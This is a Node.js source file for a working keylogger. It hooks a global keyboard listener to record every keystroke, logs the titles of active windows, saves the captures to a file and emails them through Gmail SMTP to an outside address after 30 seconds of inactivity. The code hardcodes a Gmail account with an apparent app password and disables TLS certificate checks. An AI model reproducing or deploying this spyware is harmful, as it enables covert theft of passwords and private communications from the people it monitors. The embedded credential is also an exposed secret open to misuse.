const nodemailer = require('nodemailer');
const path = require('path');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;

// Initialize an empty string to store the current output
let currentOutput = "";

// Variable to track the inactivity timeout
let inactivityTimeout;

let isUpperCase = false;
let capsLockPressed = false;


// Function to update the output
const specialCharacters = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    'DOT': '>',
    'COMMA': '<',
    'MINUS': '_',
    'EQUALS': '+',
    'FORWARD SLASH': '?',
    'SQUARE BRACKET OPEN': '{',
    'SQUARE BRACKET CLOSE': '}',
    'SECTION': '~',
    'QUOTE': '"',
    'SEMICOLON': ':',
    'BACKSLASH': '|',
};

function updateOutput(keyName, shiftState) {
    // checks if the Caps Lock key is pressed
    if (keyName === "CAPS LOCK"){
        capsLockPressed = !capsLockPressed;
        currentOutput += `<CAPS LOCK>`;
        return;
    }

    // Check if the keyName is a number and if the shift key is pressed
    if (/^\d$/.test(keyName) && shiftState) {
        keyName = specialCharacters[keyName] || keyName;
    }

    // Convert the keyName to lowercase
    let enclosedKey;
    if (specialCharacters[keyName]){
        enclosedKey = `${shiftState ? specialCharacters[keyName] : keyName}`;
    }
    else if (keyName.match(/^[a-zA-Z]$/)) {
        if (capsLockPressed) {
            enclosedKey = shiftState ? keyName.toLowerCase() : keyName.toUpperCase();
        } else {
            enclosedKey = shiftState ? keyName.toUpperCase() : keyName.toLowerCase();
        }
    } else {
        enclosedKey = specialCharacters[keyName.charCodeAt(0).toString()] || `<${keyName}>`;
    }

    currentOutput += enclosedKey + " ";

    // Clear the entire console
    process.stdout.write('\x1Bc');

    // Write the updated output without the trailing space
    process.stdout.write(currentOutput.trim());

    clearTimeout(inactivityTimeout);
    inactivityTimeout = setTimeout(() => {
        sendLogsByEmail(currentOutput);
        currentOutput = "";
    }, 30000);
}

const filePath = path.join(__dirname, 'logs.txt');

function saveLogsToFile(logs) {
    fs.appendFileSync(filePath, logs + '\n', 'utf8', function(error) {
        if (error) {
            console.error('Error writing to file:', error);
        } else {
            console.log('Logs saved to file.');
        }
    });
}



// Configure nodemailer with SMTP transport
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'kuyanoy828@gmail.com',
        pass: 'yryb qfnj othk xhyu'
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Function to send logs via email
function sendLogsByEmail(logs) {
    saveLogsToFile(logs);  // Save the logs to the file before sending

    const mailOptions = {
        from: 'kuyanoy828@gmail.com',
        to: 'joruam@my.cspc.edu.ph',
        subject: 'Keyboard Logs',
        text: 'Attached are the keyboard logs.',
        attachments: [
            {
                filename: 'logs.txt',
                path: filePath
            }
        ]
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
            // Clear the file content after sending
            fs.writeFileSync(filePath, '', 'utf8', function(error) {
                if (error) {
                    console.error('Error clearing file:', error);
                } else {
                    console.log('Logs file cleared.');
                }
            });
        }
    });
}


const v = new GlobalKeyboardListener();
const keyState = {}; // Track the state of keys

v.addListener(function (e, down) {
    // console.log(e);
    const keyName = e.name;
    if (!keyState[keyName]) {
        updateOutput(keyName, down['LEFT SHIFT'] || down['RIGHT SHIFT']);
        keyState[keyName] = true;
    }
});


// Add a listener to reset the state when a key is released
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!down[keyName]) {
        keyState[keyName] = false;
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (e.name == "<SPACE>" && (down["LEFT META"] || down["RIGHT META"])) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Add a listener that is only called once and demonstrate how to remove it
calledOnce = function (e) {
    console.log();
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);

const activeWindow = require('active-win');
const fs = require('fs');

let currentWindowTitle = ""; // Store the title of the currently active window/tab

// Function to update the active window information
async function updateActiveWindowInfo() {
    try {
        const windowInfo = await activeWindow();
        const newWindowTitle = windowInfo.title;

        if (newWindowTitle !== currentWindowTitle) {
            // The user has changed tabs or windows, update the information
            const output = `Active Window: ${newWindowTitle}\n`;
            console.log(output);

            // If the currentOutput already has data, append a new line before adding the active window info
            if (currentOutput) {
                currentOutput += "\n" + output;
            } else {
                currentOutput += output;
            }

            // Update the current window title
            currentWindowTitle = newWindowTitle;

            // Clear the entire console and write the updated output with active window info
            process.stdout.write('\x1Bc');
            process.stdout.write(currentOutput.trim());
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

// Add a timer to periodically update the active window info
setInterval(updateActiveWindowInfo, 1000); // Update every 1 second

